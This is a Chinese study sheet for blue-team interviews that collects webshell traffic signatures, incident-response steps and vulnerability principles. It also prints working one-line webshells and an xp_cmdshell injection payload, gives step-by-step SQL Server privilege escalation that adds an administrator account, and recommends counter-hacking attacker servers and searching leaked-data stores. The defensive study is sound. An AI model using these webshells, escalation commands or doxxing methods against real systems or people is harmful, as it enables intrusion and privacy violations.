# Hvv面试题目（蓝初）

## 流量特征

https://blog.csdn.net/qq_53577336/article/details/125048353

### 菜刀流量特征

常见一句话(Eval)：

#### php一句话:

```
<?php @eval($_POST['caidao']);?>
```

#### ASP一句话:

```
<%eval request("caidao")%>
```

数据包末尾**i=A&z0=GB2312**

#### asp.net一句话:

```
<%@ Page Language="Jscript"%><%eval(Request.Item["caidao"],"unsafe");%>
```

> 1："Execute"Execute函数用于执行传递的攻击payload，这是必不可少的，这个等同于php类中eval函数； 
>
> 2：OnError ResumeNext，这部分是大部分ASP客户端中必有的流量，能保证不管前面出任何错，继续执行以下代码。
>
> 3：Response.Write和Response.End是必有的，是来完善整个操作的。

请求体中传递的payload为base64编码，并且存在固定的为

> QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J

unicode编码

### 中国蚁剑流量特征

#### php

每个请求体都存在 `@ini_set(“display_errors”, “0”);@set_time_limit(0)` 开头，并且存在 base64_decode 等字符。

#### ASP

OnError ResumeNext、Response.End、Response.Write

**Ex"&cHr(101)&"cute**

参数名大多以："_0x......="这种形式

### 冰蝎

```
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
```

### 哥斯拉

```
（ClassLoader，getClass().getClassLoader())//jsp
```

> 所有请求中Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
> 所有请求中Cookie中后面都存在 ; （分号）
> 所有响应中Cache-Control: no-store, no-cache, must-revalidate,

### sqlmap

```
（AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#）
```

- 数组
- 报错特征
- @@version_compile_os特征
- 测试命令执行语句特征
- 调用系统命令特征

#### 命令执行函数

assert、system、proc_open、shell_exec、passthru、popen、exec

eval

### 流量分析(wireshark)

- 过滤ip:

- - 过滤源ip地址:`ip.src==1.1.1.1`; 过滤目的ip地址: `ip.dst==1.1.1.1`

- 过端口:

- - 过滤80端口：`tcp.port==80`，源端口：`tcp.srcport=80`，目的端口：`tcp.dsttport==80`

- 协议过滤:

- - 直接输入协议名即可，http or https

- http模式过滤:

- - 过滤 get/post包 http.request.mothod=="GET/POST"

## 溯源思路（需要修改）

溯源思路：首先通过系统日志、安全设备截获攻击包等从中分析出攻击者的ip和攻击方式，通过webshell或者木马去微步分析，或者去安恒威胁情报中心进行ip检测分析，是不是云服务器，基站等，如果是云服务器的话可以直接反渗透，看看开放端口，域名，whois等进行判断，获取姓名电话等丢社工库看看能不能找到更多信息然后收工

## 应急思路（需要修改）

首先通过安全设备拦截攻击包体和日志分析，了解攻击者具体进行了什么样的攻击，通过黑白结合模拟方法进一步判断攻击者的攻击方式。复现之后对漏洞进行修复，对攻击者进行溯源。

### 内存马排查

先查看检查服务器web日志，查看是否有可疑的web访问日志，比如说filter或者listener类型的内存马，会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的请求。

如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。

查看是否有类似哥斯拉、冰蝎特征的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。

通过查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马。
————————————————
版权声明：本文为CSDN博主「[l_l]」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。
原文链接：https://blog.csdn.net/SimoSimoSimo/article/details/127700190

## 网络服务器容器

IIS、Apache、nginx、Lighttpd、Tomcat

- IIS 6.0—— /xx.asp/xx.jpg
- IIS 7.0—— 默认Fast-cgi开启，直接在图片地址后面输入/.php就会将图片当做php解析
- Nginx——版本小于0.8.37 利用方法和IIS7.0一样
- Apache—— 上传文件名为test.php.x1.x2.x3, Apache是从右往左判断
- Lighttpd—— XX.jpg/xx.php

### OWASP TOP10

 SQL注入
 失效的身份认证
 敏感数据泄露
 XML外部实体（XXE）
 失效的访问控制
 安全配置错误
 跨站脚本（XSS）
 不安全的反序列化
 使用含有已知漏洞的组件
 不足的日志记录和监控

### 判断框架

如何手工识别一个网站是struct2框架

> 1. 通过页面回显的错误消息来判断，页面不回显错误消息时则无效。
> 2. 通过网页后缀来判断，如.do，.action，有可能不准。
> 3. 判断 /struts/webconsole.html 是否存在来进行判断，需要 devMode 为 true。
>
> 
>
> 大佬自己的方法（https://www.cnblogs.com/greencollar/p/14119662.html）：
>
> 方法一：通过 actionErrors。此方法最早应该是由 kxlzx 在好些年前提出来的。要求是对应的 Action 需要继承自 ActionSupport 类。
>
> 利用方法：如原始 URL 为 https://threathunter.org/则检测所用的 URL 为 https://threathunter.org/?actionErrors=1111
>
> 如果返回的页面出现异常，则可以认定为目标是基于 Struts2 构建的。异常包括但不限于以下几种现象：
>
> 1. 页面直接出现 404 或者 500 等错误
> 2. 页面上输出了与业务有关错误消息，或者 1111 被回显到了页面上
> 3. 页面的内容结构发生了明显的改变
> 4. 页面发生了重定向
>
> 方法二：通过 CheckboxInterceptor。这是我在调试 Struts2 的过程中找到的方法。本来是想找到一个 100% 通杀的办法的，结果没有找到。
>
> 要求：需要有一个能够回显到页面上的字符串类型的参数。我目前碰到的最多的地方就是各个目标的搜索功能。搜索功能往往会将 keyword 回显到页面上。
>
> 此拦截器本意是配合 HTML 中的 checkbox 来使用的，当某个参数没有被提交的时候，则认定这个 checkbox 没有被选中。

## 端口

> 20 21ftp21端口是用于控制 数据传输看情况
>
> 22 ssh
>
> 23 telnet
>
> 25 SMTP
>
> 53 DNS
>
> 80 web
>
> 110 POP3 电子邮件
>
> 995 POP3连接
>
> 135 RPC
>
> 143 IMAP服务接收邮件
>
> 389 LDAP轻量目录访问
>
> 443 https
>
> 1433 SQLserver
>
> 3306 数据库
>
> 3389 远程桌面连接
>
> 6379 redis
>
> 7001:weblogic

## 漏洞原理

### shiro反序列化原理

AES加密的密钥Key被硬编码在代码里，意味着每个人通过源代码都能拿到AES加密的密钥。因此，攻击者构造一个恶意的对象，并且对其序列化，AES加密，base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞

### SQL注入原理

下面我们来说一下sql注入原理，以使读者对sql注入攻击有一个感性的认识，至于其他攻击，原理是一致的。

   SQL注射能使攻击者绕过认证机制，完全控制远程服务器上的数据库。 SQL是结构化查询语言的简称，它是访问数据库的事实标准。目前，大多数Web应用都使用SQL数据库来存放应用程序的数据。几乎所有的Web应用在后台 都使用某种SQL数据库。跟大多数语言一样，SQL语法允许数据库命令和用户数据混杂在一起的。如果开发人员不细心的话，用户数据就有可能被解释成命令， 这样的话，远程用户就不仅能向Web应用输入数据，而且还可以在数据库上执行任意命令了。

### SQL注入防护方法

- 使用安全的Api
- 对输入的特殊字符进行escape转义处理
- 使用白名单来规范化输入验证方法
- 对客户端输入进行控制，不允许输入SQL注入相关的特殊字符
- 服务器端在提交数据库进行SQL注入查询之前，对特殊字符进行过滤，转义，替换，删除
- 预编译
- 防火墙（不在代码层面）waf

### SSRF和CSRF的区别

SSRF作用于服务端，CSRF作用于客户端

### SSRF配合哪个协议去攻击Redis

Gopher

### 文件上传绕过思路

> 前端js绕过
>
> 黑白名单绕过，如果可以上传phtml php3 php4 php5 Php php (空格) php.，pphphp
>
> 针对文件类型绕过，content-type字段
>
> win系统解析漏洞绕过
>
> 1、上传1.php(或者图片马)，抓包改为1.php.
>
> 2、上传1.php(或者图片马)，抓包改为1.php::$DATA
>
> 3、上传1.php(或者图片马)，抓包改为1.php:1.jpg
>
> 4、上传1.php(或者图片马)，抓包改为1.php::$DATA…….
>
> 配合.htaccess、.user.ini

## 内网（蓝中）

### SQLServer提权

##### 使用xp_cmdshell进行提权

> **假设条件：**
> 1、已得到 sql server 的sa权限
> 2、sql server开启外联

```
使用sql server的客户端连接数据库
sql sever有一个自带的系统数据库master，而xp_cmdshell在 存储过程、扩展存储过程中

查看扩展存储过程，如果其中含有 sys.xp_cmdshell 说明目标网站没有删除该组件，只是默认把该组件禁止，如果没有看到该组件说明已删除xp_cmdshell，那么可以上传dll文件进行删除，其中dll文件要根据sql server 数据库版本进行选择

选择数据库后，再进行新建查询

执行"EXEC master.dbo.xp_cmdshell 'whoami'"命令后，报错提示 xp_cmdshell 被关闭

那么就使用开启 xp_cmdshell 的命令（只有sa权限才可以开启）
EXEC sp_configure 'show advanced options', 1
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

开启 xp_cmdshell 之后，再次执行 EXEC master.dbo.xp_cmdshell 'whoami' 命令，成功提权到system权限。

##简单总结
xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它。

启用：
EXEC sp_configure 'show advanced options', 1
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

关闭：
exec sp_configure 'show advanced options', 1;
reconfigure;
exec sp_configure 'xp_cmdshell', 0;
reconfigure;

执行：
EXEC master.dbo.xp_cmdshell '命令'

如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复
exec master.sys.sp_addextendedproc 'xp_cmdshell', 'C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll'
```

##### 使用sp_oacreate进行提权

```
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >c:\\1.txt'
执行命令后，报错提示 sp_oacreate组件 被关闭

那么就使用开启 xp_cmdshell 的命令（只有sa权限才可以开启）
EXEC sp_configure 'show advanced options', 1;   
RECONFIGURE WITH OVERRIDE;   
EXEC sp_configure 'Ole Automation Procedures', 1;   
RECONFIGURE WITH OVERRIDE;   

开启之后，whoami查看权限

##总结
启用：
EXEC sp_configure 'show advanced options', 1;   
RECONFIGURE WITH OVERRIDE;   
EXEC sp_configure 'Ole Automation Procedures', 1;   
RECONFIGURE WITH OVERRIDE;   

关闭：
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE WITH OVERRIDE;   
EXEC sp_configure 'Ole Automation Procedures', 0;   
RECONFIGURE WITH OVERRIDE;  

执行：
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >c:\\1.txt'

以上是使用sp_oacreate的提权语句，主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令。
```

###### 使用SQL Server 沙盒提权

```
执行添加管理员的命令后，报错：SQL Server阻止了对组件'Ad Hoc Distributed Queries'的…………
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell("net user margin margin /add")')

那么输入以下命令，启用Ad Hoc Distributed Queries：
exec sp_configure 'Ad Hoc Distributed Queries',1;
reconfigure;

再执行
exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines', 'SandBoxMode'

执行添加一个管理员 margin 命令
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell("net user margin margin /add")')

将margin用户提升到超级管理员权限
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell("net localgroup administrators margin /add")')

net localgroup administrators 查看超级管理员组账户有margin


##简单总结
--提权语句

exec sp_configure 'show advanced options',1;reconfigure;

-- 不开启的话在执行xp_regwrite会提示让我们开启，

exec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure;

--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。

exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;

--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。

exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines', 'SandBoxMode'

--执行系统命令select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell("net user margin margin /add")')

select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell("net localgroup administrators margin /add")')

沙盒模式SandBoxMode参数含义（默认是2）

`0`：在任何所有者中禁止启用安全模式

`1` ：为仅在允许范围内

`2` ：必须在access模式下

`3`：完全开启

openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。

--恢复配置

--exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;

--exec sp_configure 'Ad Hoc Distributed Queries',0;reconfigure;

--exec sp_configure 'show advanced options',0;reconfigure;
```

https://blog.csdn.net/weixin_40412037/article/details/112858836
